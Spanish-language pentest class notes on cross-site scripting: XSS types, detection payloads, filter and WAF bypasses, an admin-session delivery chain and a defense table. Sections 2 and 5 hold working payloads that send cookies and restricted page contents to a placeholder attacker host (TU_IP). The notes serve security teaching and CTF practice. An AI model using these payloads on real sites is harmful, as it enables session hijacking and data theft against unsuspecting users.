# XSS — Cross-Site Scripting

> XSS es una de las vulnerabilidades web más comunes y peligrosas. Permite inyectar JavaScript que se ejecuta en el navegador de otros usuarios.

> [!important] Regla de detección (clase)
> **Siempre que veas un campo de texto que refleja lo que escribes, es potencialmente XSS.** Junto a SQLi, son las dos primeras pruebas sobre cualquier input visible: caracteres especiales de ambos ataques a la vez para detectar filtrado/WAF.

---

## 1. Tipos de XSS

| Tipo | Descripción | Persistencia |
|------|-------------|-------------|
| **Reflected XSS** | El payload viaja en la URL/parámetro y se refleja en la respuesta sin sanitizar | No persistente |
| **Stored XSS** | El payload se almacena en base de datos y se muestra a todos los usuarios que visitan la página | Persistente |
| **DOM-based XSS** | La vulnerabilidad está en el código JavaScript del lado del cliente, no en el servidor | Depende del caso |

> [!tip] Reflected vs Stored en la práctica
> Si el payload **desaparece** al recargar/navegar → reflected. Si **persiste** tras recargar (o al cambiar de filtro/vista) → stored. En Stored, el ejemplo de clase es un comentario/post tipo Reddit: quien abra esa vista ejecuta el script.

> [!warning] ¿Cuándo vale un XSS en un CTF?
> En una máquina **mono-usuario** un XSS reflected no roba nada: no hay segunda víctima. Solo interesa si (1) hay sesión multiusuario real, (2) se puede forzar que un "admin" abra la ruta, o (3) se usa como señal de que **no hay sanitización** (→ probar también SSTI, HTML injection, etc. en el mismo campo).

### Cuándo buscar XSS en el recon

| Señal en la web | Vulnerabilidad potencial |
|-----------------|--------------------------|
| Blog / foro / comentarios | **XSS** (almacenado) |
| Formulario de registro / contacto | SQLi y XSS |
| Buscador con parámetro en URL | Reflected XSS + SQLi |
| Descarga de PDF | XXE |
| `/uploads` | File Upload → webshell |

---

## 2. Payloads de detección

```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
```

> [!tip] Cerrar el contexto actual
> Si el input está **dentro de un atributo o etiqueta** (p. ej. `<h1>NOMBRE</h1>`), primero se cierra ese contexto y luego se abre el script:
>
> ```html
> "></h1><script>alert(1)</script>
> " onfocus="alert(1)" autofocus="
> ';alert(1);//
> ```
>
> Payload clásico de atributo: `"><script>alert(1)</script>` o, si hay comillas, romper con `"` y disparar `onerror`/`onfocus`.

### Payloads de exfiltración de cookies

```html
<script>
fetch('http://TU_IP:8000/steal?c='+document.cookie)
</script>

<script>
new Image().src='http://TU_IP:8000/steal?c='+document.cookie
</script>

<img src=x onerror="fetch('http://TU_IP:8000/steal?c='+document.cookie)">
```

> [!warning] HttpOnly
> Si la cookie de sesión tiene el flag **HttpOnly**, `document.cookie` **no la ve**: el XSS no la roba directamente. Se mitiga con Secure + HttpOnly + SameSite; en informes se reporta mucho (flag en false = hallazgo).

---

## 3. El valor real del XSS: el delivery

No está en el `alert()`, sino en el mecanismo de **delivery**: cómo se consigue que otro usuario (idealmente un administrador) lo ejecute.

### Cadena completa de explotación

1. Un **Markdown Viewer** permite subir contenido con `<script>`
2. La aplicación ofrece un botón "Share" que genera un enlace compartible
3. Ese enlace es el **vector de entrega** → se envía al admin
4. El admin abre el enlace → el script se ejecuta en su navegador
5. Se roba la sesión del admin → acceso a rutas restringidas

> [!info] Impacto real (resumen de clase)
> Lo máximo que habilita un XSS es, en el mejor de los casos, **robar la cookie de sesión** (si no es HttpOnly) o hacer phishing con la URL legítima. En Stored multiusuario, ese robo es **continuo** sin que la víctima lo sepa. En un CTF mono-usuario solo sirve como prueba de ausencia de sanitización.

---

## 4. Confirmar interacción del administrador

Levantar un servidor HTTP local y comprobar si llega una petición:

```bash
python3 -m http.server 8000
# Enviar por el formulario de contacto: http://TU_IP:8000/track
# Si aparece un GET en el log del servidor, el admin ha abierto el enlace
```

También con Burp **Collaborator** / OOB: si hay callback cuando no hay cambio visible en la app, el payload se ejecutó.

---

## 5. Exfiltración de datos

Una vez confirmada la interacción, forzar al navegador de la víctima a hacer `fetch()` hacia una ruta restringida y exfiltrar el contenido codificado en Base64:

```html
<script>
fetch('/message.php')
  .then(r => r.text())
  .then(t => fetch('http://TU_IP:8000/exfil?data=' + btoa(t)));
</script>
```

> **Base64 no es cifrado:** es solo un envoltorio para transportar contenido sin romper el formato de la petición.

---

## 6. XSS en diferentes contextos

### XSS en atributos HTML

```html
" onfocus="alert(1)" autofocus="
" onmouseover="alert(1)"
'><script>alert(1)</script>
```

### XSS en JavaScript

```
';alert(1);//
"-alert(1)-"
</script><script>alert(1)</script>
```

### XSS en CSS (limitado)

```css
<style>
body { background: url("javascript:alert(1)") }
</style>
```

---

## 7. Bypass de filtros

| Filtro | Bypass |
|--------|--------|
| `<script>` bloqueado | `<img src=x onerror=alert(1)>` |
| `alert` bloqueado | `prompt(1)`, `confirm(1)`, `window.onerror=alert;throw 1` |
| `onerror` bloqueado | `<svg onload=alert(1)>` |
| Comillas bloqueadas | Usar entidades HTML: `&#39;`, `&#34;` |
| Mayúsculas bloqueadas | `<ScRiPt>`, `<IMG SRC=x OnErRoR=alert(1)>` |
| Espacios bloqueados | Tab `\t`, newline `\n`, `%0a`, `%0d` |

### Estrategia de prueba (clase)

1. Escribir en el campo y ver **si refleja** en la página (o se guarda en BD).
2. Probar **caracteres especiales de XSS y SQLi a la vez** (comillas, `<`, `>`) para ver si el WAF/filtro bloquea uno u otro.
3. Si un payload no funciona, probar **payloads alternativos de la misma familia** (evento distinto, tag distinto): si `onerror` falla, prueba `onload`; si `script` falla, prueba `img`/`svg`.
4. Si hay WAF: case variation, encoding, comentarios, rotación de payloads + delays (no saturar).

> [!tip] Detectar WAF
> Headers `Server: cloudflare` / `X-CDN` / `X-WAF`, o 403/406 ante payloads "benignos" con caracteres especiales. Un filtro que bloquea `<script>` pero no `onerror` es blacklist incompleta → seguir iterando variantes.

---

## 8. XSS en APIs

Las APIs REST también pueden ser vulnerables a XSS si devuelven contenido HTML sin sanitizar:

```json
GET /api/users/1
{
  "name": "<script>alert(1)</script>",
  "bio": "Usuario normal"
}
```

Si el frontend renderiza `name` o `bio` sin escaping, el XSS se ejecuta.

---

## 9. Defensa contra XSS

| Medida | Descripción |
|--------|-------------|
| **Output encoding** | Convertir caracteres especiales en entidades HTML antes de renderizar |
| **Content Security Policy (CSP)** | Restringir scripts inline y dominios permitidos |
| **HttpOnly cookies** | Impedir que JavaScript acceda a las cookies de sesión |
| **Input validation** | Validar entrada en servidor con esquemas/tipos estrictos |
| **DOMPurify** | Librería para sanitizar HTML en el cliente |

---

## 10. Cadena de ataque y relaciones

```
XSS (robo de sesión admin) → acceso a ruta con LFI →
credenciales filtradas → SSH al servidor
```

| vs | Diferencia clave |
|----|------------------|
| **SQLi** | Ataca el **back** (BD). XSS ataca el **front** (navegador de la víctima). |
| **SSTI** | Ejecuta plantillas en el **servidor** (RCE). XSS ejecuta JS en el **cliente**. |
| **Command Injection** | Ejecuta comandos en el SO del servidor. |

> En un campo con XSS exitoso y **sin sanitización HTML**, es habitual probar también SSTI: si no filtra `<script>`, probablemente no filtra `{{7*7}}` ni `<%= %>`.

---

## Checklist de repaso

- [ ] ¿Distingo reflected, stored y DOM-based y sé confirmar cuál hay?
- [ ] ¿Recuerdo la regla: campo de texto que refleja → probar XSS y SQLi?
- [ ] ¿Cierro el contexto (atributo/etiqueta) antes de inyectar el script?
- [ ] ¿Sé exfiltrar cookies y explicar qué impide HttpOnly?
- [ ] ¿Entiendo que el valor está en el delivery, no en el alert()?
- [ ] ¿Confirmo interacción con http.server o Collaborator?
- [ ] ¿Itero variantes de payload cuando hay filtro/WAF?
- [ ] ¿Sé qué vulnerabilidades encajan según el recon (blog→XSS, form→SQLi...)?









---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[OWASP API Security Top 10.md|OWASP API Security Top 10]] — Metodologia Pentest, SQL Injection, XSS
- [[../../apuntes evolve/BLOQUE 4.md|BLOQUE 4]] — Metodologia Pentest, SQL Injection, XSS
- [[SSTI - Server-Side Template Injection.md|SSTI - Server-Side Template Injection]] — SQL Injection, Seguridad, XSS
- [[../comandos/BurpSuite.md|BurpSuite]] — Desarrollo Web, SQL Injection, XSS
- [[../../apuntes Joselu/MODULO3/resumen_master_clase53.md|resumen_master_clase53]] — Desarrollo Web, Metodologia Pentest, XSS

### 🌐 Cross-Dominio

- [[../../../programacion/Ruby/seguridad_ruby.md|seguridad_ruby]] — Programacion: Desarrollo Web, SQL, Seguridad
- [[../../../programacion/Java/seguridad_java.md|seguridad_java]] — Programacion: Desarrollo Web, SQL, Seguridad

> #burpsuite #cli #crypto #ffuf #java #javascript #pentest #redes #seguridad #sql #sqli #ssrf #ssti #web #xss
